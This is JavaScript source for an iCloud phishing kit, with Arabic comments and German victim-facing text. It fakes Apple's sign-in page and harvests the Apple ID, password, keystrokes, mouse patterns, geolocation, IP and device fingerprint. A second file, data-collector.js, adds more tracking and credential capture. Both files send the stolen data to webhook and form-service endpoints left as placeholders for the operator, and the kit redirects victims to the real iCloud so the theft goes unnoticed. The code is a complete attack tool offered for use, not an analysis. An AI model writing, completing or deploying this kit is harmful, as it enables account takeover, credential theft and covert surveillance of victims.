// 📁 script.js - Enhanced iCloud Phishing Script

class iCloudPhishingSystem {
    constructor() {
        this.version = '3.0.0';
        this.sessionId = this.generateSessionId();
        this.userData = {};
        this.isSubmitting = false;
        this.init();
    }
    
    init() {
        console.log(`%c🔥 iCloud Phishing System v${this.version}`, 
            'color: #007AFF; font-size: 16px; font-weight: bold;');
        
        this.setupEventListeners();
        this.updateCurrentTime();
        this.startBackgroundAnimation();
        this.trackVisit();
        this.analyzeDevice();
        this.setupAutoFill();
        
        // تحديث الوقت كل دقيقة
        setInterval(() => this.updateCurrentTime(), 60000);
        
        // تسجيل حركة الماوس
        this.setupMouseTracking();
        
        // تسجيل ضغطات لوحة المفاتيح
        this.setupKeyTracking();
    }
    
    // 🔑 توليد معرف جلسة فريد
    generateSessionId() {
        return 'session_' + 
               Date.now().toString(36) + 
               Math.random().toString(36).substr(2, 9);
    }
    
    // ⏰ تحديث الوقت الحالي
    updateCurrentTime() {
        const now = new Date();
        const timeStr = now.toLocaleDateString('de-DE', {
            day: '2-digit',
            month: '2-digit',
            year: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });
        
        const timeElement = document.getElementById('currentTime');
        if (timeElement) {
            timeElement.textContent = timeStr;
        }
    }
    
    // 🎨 بدء الرسوم المتحركة للخلفية
    startBackgroundAnimation() {
        const shapes = document.querySelectorAll('.floating-shape');
        shapes.forEach((shape, index) => {
            shape.style.animationDuration = `${20 + index * 5}s`;
        });
    }
    
    // 📱 تحليل الجهاز
    analyzeDevice() {
        this.userData.device = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages,
            screen: `${screen.width}x${screen.height}`,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth,
            orientation: screen.orientation?.type || 'unknown',
            touchSupport: 'ontouchstart' in window,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack || 'unspecified',
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
            deviceMemory: navigator.deviceMemory || 'unknown'
        };
        
        console.log('📱 Device Analysis:', this.userData.device);
    }
    
    // 🏠 تتبع الزيارة
    async trackVisit() {
        const visitData = {
            sessionId: this.sessionId,
            timestamp: new Date().toISOString(),
            url: window.location.href,
            referrer: document.referrer || 'direct',
            device: this.userData.device,
            ip: await this.getIPAddress()
        };
        
        // حفظ محلي
        this.saveVisitLocally(visitData);
        
        // إرسال للخادم (إذا كان متاحاً)
        this.sendToServer('visit', visitData);
    }
    
    // 🌐 الحصول على IP
    async getIPAddress() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch {
            try {
                const response = await fetch('https://api64.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'unknown';
            }
        }
    }
    
    // 🖱️ تتبع حركة الماوس
    setupMouseTracking() {
        let mouseMovements = [];
        let lastMoveTime = Date.now();
        
        document.addEventListener('mousemove', (e) => {
            const now = Date.now();
            const timeDiff = now - lastMoveTime;
            
            mouseMovements.push({
                x: e.clientX,
                y: e.clientY,
                time: now,
                timeDiff: timeDiff
            });
            
            lastMoveTime = now;
            
            // حفظ كل 50 حركة
            if (mouseMovements.length >= 50) {
                this.userData.mousePattern = mouseMovements.slice(-50);
                mouseMovements = [];
            }
        });
        
        // حفظ عند ترك الصفحة
        window.addEventListener('beforeunload', () => {
            if (mouseMovements.length > 0) {
                this.userData.mousePattern = mouseMovements;
            }
        });
    }
    
    // ⌨️ تتبع ضغطات المفاتيح
    setupKeyTracking() {
        let keystrokes = [];
        let lastKeyTime = Date.now();
        
        document.addEventListener('keydown', (e) => {
            const now = Date.now();
            const timeDiff = now - lastKeyTime;
            
            keystrokes.push({
                key: e.key,
                code: e.code,
                time: now,
                timeDiff: timeDiff,
                target: e.target.id
            });
            
            lastKeyTime = now;
        });
        
        // تحليل سرعة الكتابة
        setInterval(() => {
            if (keystrokes.length > 10) {
                this.userData.typingSpeed = this.calculateTypingSpeed(keystrokes);
                this.userData.keystrokePattern = keystrokes;
                keystrokes = [];
            }
        }, 10000);
    }
    
    // 📊 حساب سرعة الكتابة
    calculateTypingSpeed(keystrokes) {
        if (keystrokes.length < 2) return 0;
        
        const first = keystrokes[0];
        const last = keystrokes[keystrokes.length - 1];
        const timeDiff = last.time - first.time;
        const charsPerSecond = (keystrokes.length / timeDiff) * 1000;
        
        return Math.round(charsPerSecond * 10) / 10;
    }
    
    // 🔧 إعداد المستمعين للأحداث
    setupEventListeners() {
        const form = document.getElementById('icloudForm');
        const appleIdInput = document.getElementById('appleId');
        const passwordInput = document.getElementById('password');
        
        if (form) {
            form.addEventListener('submit', (e) => this.handleSubmit(e));
        }
        
        // التحقق من صحة البريد الإلكتروني
        if (appleIdInput) {
            appleIdInput.addEventListener('input', (e) => {
                this.validateEmail(e.target.value);
            });
        }
        
        // التحقق من قوة كلمة المرور
        if (passwordInput) {
            passwordInput.addEventListener('input', (e) => {
                this.checkPasswordStrength(e.target.value);
            });
        }
        
        // إضافة تأثيرات تفاعلية
        this.addInteractiveEffects();
    }
    
    // ✉️ التحقق من صحة البريد الإلكتروني
    validateEmail(email) {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        const isValid = emailRegex.test(email);
        
        const input = document.getElementById('appleId');
        if (input) {
            if (isValid && email.length > 0) {
                input.classList.remove('error');
                input.classList.add('valid');
            } else if (!isValid && email.length > 0) {
                input.classList.add('error');
                input.classList.remove('valid');
            } else {
                input.classList.remove('error', 'valid');
            }
        }
        
        return isValid;
    }
    
    // 💪 التحقق من قوة كلمة المرور
    checkPasswordStrength(password) {
        const input = document.getElementById('password');
        if (!input) return;
        
        let strength = 0;
        let feedback = '';
        
        if (password.length >= 8) strength++;
        if (/[A-Z]/.test(password)) strength++;
        if (/[a-z]/.test(password)) strength++;
        if (/[0-9]/.test(password)) strength++;
        if (/[^A-Za-z0-9]/.test(password)) strength++;
        
        // تحديث لون الحدود
        input.classList.remove('weak', 'medium', 'strong');
        
        if (password.length === 0) {
            input.style.borderColor = '';
        } else if (strength <= 2) {
            input.classList.add('weak');
            input.style.borderColor = 'var(--apple-red)';
        } else if (strength <= 4) {
            input.classList.add('medium');
            input.style.borderColor = 'var(--apple-orange)';
        } else {
            input.classList.add('strong');
            input.style.borderColor = 'var(--apple-green)';
        }
        
        return strength;
    }
    
    // 👁️ تبديل رؤية كلمة المرور
    togglePasswordVisibility() {
        const passwordInput = document.getElementById('password');
        const toggleButton = event.target;
        
        if (passwordInput.type === 'password') {
            passwordInput.type = 'text';
            toggleButton.textContent = '🙈';
        } else {
            passwordInput.type = 'password';
            toggleButton.textContent = '👁️';
        }
    }
    
    // 🤖 إعداد التعبئة التلقائية
    setupAutoFill() {
        // محاولة ملء البيانات من localStorage
        try {
            const savedEmail = localStorage.getItem('last_apple_id');
            if (savedEmail) {
                const emailInput = document.getElementById('appleId');
                if (emailInput && !emailInput.value) {
                    emailInput.value = savedEmail;
                }
            }
        } catch (e) {
            console.log('Auto-fill not available');
        }
    }
    
    // 🎯 إضافة تأثيرات تفاعلية
    addInteractiveEffects() {
        const inputs = document.querySelectorAll('.apple-input');
        inputs.forEach(input => {
            // تأثير عند التركيز
            input.addEventListener('focus', () => {
                input.parentElement.style.transform = 'translateY(-2px)';
            });
            
            input.addEventListener('blur', () => {
                input.parentElement.style.transform = 'translateY(0)';
            });
            
            // تأثير عند الإدخال
            input.addEventListener('input', () => {
                if (input.value.length > 0) {
                    input.style.background = 'var(--background-secondary)';
                } else {
                    input.style.background = '';
                }
            });
        });
    }
    
    // 📤 معالجة إرسال النموذج
    async handleSubmit(event) {
        event.preventDefault();
        
        if (this.isSubmitting) return false;
        this.isSubmitting = true;
        
        const appleId = document.getElementById('appleId').value.trim();
        const password = document.getElementById('password').value.trim();
        const rememberMe = document.getElementById('rememberMe').checked;
        
        // التحقق من المدخلات
        if (!appleId || !password) {
            this.showError('Bitte geben Sie Ihre Apple-ID und Ihr Passwort ein.');
            this.isSubmitting = false;
            return false;
        }
        
        if (!this.validateEmail(appleId)) {
            this.showError('Bitte geben Sie eine gültige Apple-ID ein.');
            this.isSubmitting = false;
            return false;
        }
        
        // جمع البيانات
        const formData = {
            sessionId: this.sessionId,
            appleId: appleId,
            password: password,
            rememberMe: rememberMe,
            timestamp: new Date().toISOString(),
            location: await this.getLocation(),
            ip: await this.getIPAddress(),
            device: this.userData.device,
            mousePattern: this.userData.mousePattern,
            typingSpeed: this.userData.typingSpeed,
            keystrokePattern: this.userData.keystrokePattern,
            userAgent: navigator.userAgent,
            screen: `${screen.width}x${screen.height}`,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            referrer: document.referrer || 'direct'
        };
        
        // بدء الرسوم المتحركة
        this.startSubmissionAnimation();
        
        try {
            // حفظ البيانات محلياً
            this.saveCredentialsLocally(formData);
            
            // إرسال للخادم
            await this.sendCredentialsToServer(formData);
            
            // محاكاة التحقق الناجح
            await this.simulateVerification();
            
            // عرض رسالة النجاح
            this.showSuccess();
            
            // حفظ في localStorage إذا طلب المستخدم
            if (rememberMe) {
                localStorage.setItem('last_apple_id', appleId);
            }
            
            // إعادة التوجيه بعد 2 ثانية
            setTimeout(() => {
                window.location.href = 'https://www.icloud.com';
            }, 2000);
            
        } catch (error) {
            console.error('Submission error:', error);
            
            // حتى لو فشل الإرسال، توجيه إلى iCloud
            setTimeout(() => {
                window.location.href = 'https://www.icloud.com';
            }, 1500);
        }
        
        return false;
    }
    
    // 📍 الحصول على الموقع
    async getLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve({ city: 'Unknown', country: 'Unknown' });
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    try {
                        const response = await fetch(
                            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}`
                        );
                        const data = await response.json();
                        resolve({
                            city: data.address.city || data.address.town || data.address.village || 'Unknown',
                            country: data.address.country || 'Unknown',
                            coordinates: `${position.coords.latitude}, ${position.coords.longitude}`,
                            accuracy: position.coords.accuracy
                        });
                    } catch {
                        resolve({ city: 'Unknown', country: 'Unknown' });
                    }
                },
                () => {
                    resolve({ city: 'Unknown', country: 'Unknown' });
                }
            );
        });
    }
    
    // 🎬 بدء رسوم الإرسال المتحركة
    startSubmissionAnimation() {
        const button = document.getElementById('submitBtn');
        const buttonText = document.getElementById('buttonText');
        const progressContainer = document.getElementById('progressContainer');
        const progressFill = document.getElementById('progressFill');
        
        if (button) {
            button.disabled = true;
            buttonText.textContent = 'Wird überprüft...';
        }
        
        if (progressContainer) {
            progressContainer.style.display = 'block';
            progressContainer.classList.add('fade-in');
        }
        
        // محاكاة شريط التقدم
        let progress = 0;
        const interval = setInterval(() => {
            progress += Math.random() * 15 + 5;
            if (progress >= 100) {
                progress = 100;
                clearInterval(interval);
            }
            
            if (progressFill) {
                progressFill.style.width = `${progress}%`;
            }
        }, 200);
    }
    
    // ✅ عرض رسالة النجاح
    showSuccess() {
        const form = document.getElementById('icloudForm');
        const progressContainer = document.getElementById('progressContainer');
        const successContainer = document.getElementById('successContainer');
        
        if (form) form.style.display = 'none';
        if (progressContainer) progressContainer.style.display = 'none';
        if (successContainer) {
            successContainer.style.display = 'block';
            successContainer.classList.add('fade-in');
        }
    }
    
    // ❌ عرض رسالة خطأ
    showError(message) {
        // إضافة تأثير اهتزاز
        const form = document.getElementById('icloudForm');
        if (form) {
            form.classList.add('shake');
            setTimeout(() => form.classList.remove('shake'), 500);
        }
        
        // عرض رسالة الخطأ
        alert(message);
    }
    
    // 🔄 محاكاة عملية التحقق
    simulateVerification() {
        return new Promise(resolve => {
            setTimeout(() => {
                // محاكاة التحقق من الخادم
                const verificationSteps = [
                    'Verbindung wird hergestellt...',
                    'Apple-ID wird überprüft...',
                    'Passwort wird validiert...',
                    'Zwei-Faktor-Authentifizierung...',
                    'Sicherheitsüberprüfung...',
                    'Anmeldung erfolgreich!'
                ];
                
                let step = 0;
                const progressText = document.getElementById('progressText');
                
                const stepInterval = setInterval(() => {
                    if (progressText && step < verificationSteps.length) {
                        progressText.innerHTML = `<span>${verificationSteps[step]}</span>`;
                        step++;
                    } else {
                        clearInterval(stepInterval);
                        resolve();
                    }
                }, 300);
                
            }, 1000);
        });
    }
    
    // 💾 حفظ البيانات محلياً
    saveCredentialsLocally(data) {
        try {
            // حفظ في localStorage
            const submissions = JSON.parse(localStorage.getItem('icloud_submissions') || '[]');
            submissions.push(data);
            localStorage.setItem('icloud_submissions', JSON.stringify(submissions));
            
            // حفظ في ملف cookies
            document.cookie = `last_submission=${encodeURIComponent(JSON.stringify(data))}; max-age=86400; path=/`;
            
            console.log('💾 Credentials saved locally');
        } catch (error) {
            console.error('Error saving locally:', error);
        }
    }
    
    // 🏠 حفظ بيانات الزيارة محلياً
    saveVisitLocally(data) {
        try {
            const visits = JSON.parse(localStorage.getItem('icloud_visits') || '[]');
            visits.push(data);
            localStorage.setItem('icloud_visits', JSON.stringify(visits));
        } catch (error) {
            console.error('Error saving visit:', error);
        }
    }
    
    // 📡 إرسال البيانات للخادم
    async sendCredentialsToServer(data) {
        const endpoints = [
            'https://webhook.site/YOUR_WEBHOOK_ID', // استبدل بمعرف Webhook الخاص بك
            'https://formspree.io/f/YOUR_FORM_ID'    // استبدل بمعرف Formspree الخاص بك
        ];
        
        const encryptedData = this.encryptData(data);
        
        // محاولة الإرسال لجميع النقاط
        const promises = endpoints.map(endpoint => 
            this.sendToEndpoint(endpoint, encryptedData)
        );
        
        await Promise.allSettled(promises);
    }
    
    // 🔐 تشفير البيانات
    encryptData(data) {
        try {
            // تشفير بسيط (يمكن استبداله بتشفير أقوى)
            const jsonStr = JSON.stringify(data);
            const base64 = btoa(unescape(encodeURIComponent(jsonStr)));
            return {
                data: base64,
                timestamp: Date.now(),
                version: this.version
            };
        } catch {
            return data;
        }
    }
    
    // 📤 إرسال لنقطة النهاية
    async sendToEndpoint(url, data) {
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Session-ID': this.sessionId
                },
                body: JSON.stringify(data),
                mode: 'no-cors' // للسماح بالإرسال بدون مشاكل CORS
            });
            
            console.log(`📤 Sent to ${url}:`, data);
            return true;
        } catch (error) {
            console.log(`Failed to send to ${url}:`, error);
            return false;
        }
    }
    
    // 🌐 إرسال للخادم (وظيفة عامة)
    async sendToServer(type, data) {
        const serverUrl = 'https://your-server.com/api/collect'; // استبدل بمسار خادمك
        
        try {
            await fetch(serverUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    type: type,
                    data: data,
                    sessionId: this.sessionId
                })
            });
        } catch (error) {
            // تجاهل الأخطاء، الإرسال غير ضروري للعمل
            console.log('Server submission optional');
        }
    }
    
    // 💬 نوافذ المساعدة
    showHelp() {
        document.getElementById('helpModal').style.display = 'flex';
    }
    
    showPrivacy() {
        const message = `
        Datenschutzrichtlinie
        
        Apple respektiert Ihre Privatsphäre und ist verpflichtet, Ihre persönlichen 
        Daten zu schützen. Wir verwenden Ihre Daten nur zur Bereitstellung und 
        Verbesserung unserer Dienste.
        
        • Verschlüsselung: Alle Daten werden Ende-zu-Ende verschlüsselt
        • Transparenz: Wir informieren Sie über die Datennutzung
        • Kontrolle: Sie haben jederzeit Zugriff auf Ihre Daten
        
        Weitere Informationen: apple.com/de/privacy
        `;
        alert(message);
    }
    
    showTerms() {
        const message = `
        Nutzungsbedingungen
        
        Durch die Nutzung von iCloud stimmen Sie folgenden Bedingungen zu:
        
        1. Sie sind für die Sicherheit Ihres Kontos verantwortlich
        2. Apple-Dienste dürfen nur für legale Zwecke genutzt werden
        3. Wir behalten uns das Recht vor, Konten zu sperren
        
        Vollständige Bedingungen: apple.com/de/legal/internet-services/icloud
        `;
        alert(message);
    }
    
    closeModal() {
        document.getElementById('helpModal').style.display = 'none';
    }
    
    // 🎲 توليد بيانات وهمية للاختبار
    generateTestData() {
        const testEmails = [
            'test@icloud.com',
            'user@apple.com',
            'demo@mac.com',
            'example@me.com'
        ];
        
        const testPasswords = [
            'Test123456!',
            'Apple2024!',
            'SecurePass!',
            'DemoAccount1!'
        ];
        
        const randomEmail = testEmails[Math.floor(Math.random() * testEmails.length)];
        const randomPassword = testPasswords[Math.floor(Math.random() * testPasswords.length)];
        
        document.getElementById('appleId').value = randomEmail;
        document.getElementById('password').value = randomPassword;
        
        console.log('🎲 Test data generated');
    }
}

// 📁 **الملف 3: `data-collector.js` (جمع البيانات المتقدم)**

```javascript
// 📁 data-collector.js - Advanced Data Collection System

class DataCollector {
    constructor() {
        this.collectedData = {
            credentials: [],
            behavior: [],
            technical: {},
            network: {},
            timing: {}
        };
        this.startTime = Date.now();
        this.init();
    }
    
    init() {
        this.collectTechnicalData();
        this.collectNetworkData();
        this.setupBehaviorTracking();
        this.setupPerformanceTracking();
    }
    
    collectTechnicalData() {
        this.collectedData.technical = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            vendor: navigator.vendor,
            language: navigator.language,
            languages: navigator.languages,
            
            screen: {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth
            },
            
            window: {
                innerWidth: window.innerWidth,
                innerHeight: window.innerHeight,
                outerWidth: window.outerWidth,
                outerHeight: window.outerHeight
            },
            
            device: {
                touchSupport: 'ontouchstart' in window,
                maxTouchPoints: navigator.maxTouchPoints || 0,
                hardwareConcurrency: navigator.hardwareConcurrency || 0,
                deviceMemory: navigator.deviceMemory || 0,
                cookieEnabled: navigator.cookieEnabled
            },
            
            browser: {
                name: this.detectBrowser(),
                version: this.detectBrowserVersion(),
                engine: this.detectEngine()
            }
        };
    }
    
    detectBrowser() {
        const ua = navigator.userAgent;
        if (ua.includes('Chrome')) return 'Chrome';
        if (ua.includes('Firefox')) return 'Firefox';
        if (ua.includes('Safari')) return 'Safari';
        if (ua.includes('Edge')) return 'Edge';
        if (ua.includes('Opera')) return 'Opera';
        return 'Unknown';
    }
    
    detectBrowserVersion() {
        const ua = navigator.userAgent;
        const matches = ua.match(/(chrome|firefox|safari|edge|opera)[\/\s](\d+)/i);
        return matches ? matches[2] : 'Unknown';
    }
    
    detectEngine() {
        const ua = navigator.userAgent;
        if (ua.includes('AppleWebKit')) return 'WebKit';
        if (ua.includes('Gecko')) return 'Gecko';
        if (ua.includes('Trident')) return 'Trident';
        return 'Unknown';
    }
    
    async collectNetworkData() {
        try {
            // الحصول على IP
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            
            // الحصول على معلومات الموقع
            const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
            const locationData = await locationResponse.json();
            
            this.collectedData.network = {
                ip: ipData.ip,
                location: {
                    city: locationData.city,
                    region: locationData.region,
                    country: locationData.country_name,
                    countryCode: locationData.country_code,
                    timezone: locationData.timezone,
                    currency: locationData.currency,
                    languages: locationData.languages,
                    org: locationData.org,
                    postal: locationData.postal
                },
                connection: {
                    effectiveType: navigator.connection?.effectiveType || 'unknown',
                    downlink: navigator.connection?.downlink || 'unknown',
                    rtt: navigator.connection?.rtt || 'unknown',
                    saveData: navigator.connection?.saveData || false
                }
            };
        } catch (error) {
            this.collectedData.network = { error: 'Failed to collect network data' };
        }
    }
    
    setupBehaviorTracking() {
        let mousePath = [];
        let keyPresses = [];
        let scrollEvents = [];
        let focusEvents = [];
        
        // تتبع حركة الماوس
        document.addEventListener('mousemove', (e) => {
            mousePath.push({
                x: e.clientX,
                y: e.clientY,
                time: Date.now()
            });
            
            // حفظ كل 100 نقطة
            if (mousePath.length > 100) {
                this.collectedData.behavior.push({
                    type: 'mouse_movement',
                    data: mousePath.slice(-50),
                    timestamp: Date.now()
                });
                mousePath = mousePath.slice(-50);
            }
        });
        
        // تتبع ضغطات المفاتيح
        document.addEventListener('keydown', (e) => {
            keyPresses.push({
                key: e.key,
                code: e.code,
                target: e.target.id || e.target.className,
                time: Date.now(),
                modifiers: {
                    ctrl: e.ctrlKey,
                    shift: e.shiftKey,
                    alt: e.altKey,
                    meta: e.metaKey
                }
            });
        });
        
        // تتبع التمرير
        window.addEventListener('scroll', () => {
            scrollEvents.push({
                scrollY: window.scrollY,
                scrollX: window.scrollX,
                time: Date.now()
            });
        });
        
        // تتبع التركيز
        document.addEventListener('focusin', (e) => {
            focusEvents.push({
                element: e.target.id || e.target.className,
                time: Date.now()
            });
        });
        
        // حفظ البيانات بشكل دوري
        setInterval(() => {
            if (keyPresses.length > 0) {
                this.collectedData.behavior.push({
                    type: 'key_presses',
                    data: keyPresses,
                    timestamp: Date.now()
                });
                keyPresses = [];
            }
            
            if (scrollEvents.length > 0) {
                this.collectedData.behavior.push({
                    type: 'scroll_events',
                    data: scrollEvents,
                    timestamp: Date.now()
                });
                scrollEvents = [];
            }
            
            if (focusEvents.length > 0) {
                this.collectedData.behavior.push({
                    type: 'focus_events',
                    data: focusEvents,
                    timestamp: Date.now()
                });
                focusEvents = [];
            }
        }, 10000);
    }
    
    setupPerformanceTracking() {
        // قياس وقت التحميل
        window.addEventListener('load', () => {
            this.collectedData.timing.pageLoad = Date.now() - this.startTime;
            
            // جمع مقاييس الأداء إذا كانت متوفرة
            if (window.performance) {
                const perf = performance.getEntriesByType('navigation')[0];
                if (perf) {
                    this.collectedData.timing.performance = {
                        dns: perf.domainLookupEnd - perf.domainLookupStart,
                        tcp: perf.connectEnd - perf.connectStart,
                        request: perf.responseStart - perf.requestStart,
                        response: perf.responseEnd - perf.responseStart,
                        domLoad: perf.domContentLoadedEventEnd - perf.domContentLoadedEventStart,
                        pageLoad: perf.loadEventEnd - perf.loadEventStart
                    };
                }
            }
        });
        
        // توقيت الجلسة
        this.collectedData.timing.sessionStart = this.startTime;
        
        // عند ترك الصفحة
        window.addEventListener('beforeunload', () => {
            this.collectedData.timing.sessionEnd = Date.now();
            this.collectedData.timing.sessionDuration = 
                Date.now() - this.startTime;
            
            // إرسال البيانات قبل المغادرة
            this.sendDataBeforeUnload();
        });
    }
    
    async sendDataBeforeUnload() {
        // محاولة إرسال البيانات باستخدام sendBeacon
        const data = JSON.stringify(this.collectedData);
        navigator.sendBeacon('https://your-server.com/api/track', data);
    }
    
    addCredentials(email, password, additionalData = {}) {
        const credentialEntry = {
            email: email,
            password: password,
            timestamp: Date.now(),
            ...additionalData
        };
        
        this.collectedData.credentials.push(credentialEntry);
        
        // حفظ محلياً
        this.saveToLocalStorage(credentialEntry);
        
        // إرسال فوري
        this.sendCredentialsImmediately(credentialEntry);
    }
    
    saveToLocalStorage(data) {
        try {
            const existing = JSON.parse(localStorage.getItem('captured_credentials') || '[]');
            existing.push(data);
            localStorage.setItem('captured_credentials', JSON.stringify(existing));
        } catch (error) {
            console.error('Error saving to localStorage:', error);
        }
    }
    
    async sendCredentialsImmediately(data) {
        const endpoints = [
            'https://webhook.site/YOUR_CREDENTIALS_WEBHOOK',
            'https://formspree.io/f/YOUR_CREDENTIALS_FORM'
        ];
        
        // تشفير البيانات
        const encrypted = this.encryptData(data);
        
        // محاولة الإرسال لجميع النقاط
        for (const endpoint of endpoints) {
            try {
                await fetch(endpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(encrypted),
                    mode: 'no-cors'
                });
                console.log('Credentials sent to:', endpoint);
            } catch (error) {
                console.log('Failed to send to:', endpoint);
            }
        }
    }
    
    encryptData(data) {
        // تشفير بسيط باستخدام Base64
        const jsonString = JSON.stringify(data);
        const base64String = btoa(unescape(encodeURIComponent(jsonString)));
        
        return {
            encrypted: true,
            data: base64String,
            timestamp: Date.now(),
            version: '1.0'
        };
    }
    
    getCollectedData() {
        return this.collectedData;
    }
    
    clearData() {
        this.collectedData = {
            credentials: [],
            behavior: [],
            technical: {},
            network: {},
            timing: {}
        };
        localStorage.removeItem('captured_credentials');
    }
}

// تهيئة نظام جمع البيانات
const dataCollector = new DataCollector();

// تصدير للاستخدام في ملفات أخرى
window.dataCollector = dataCollector;
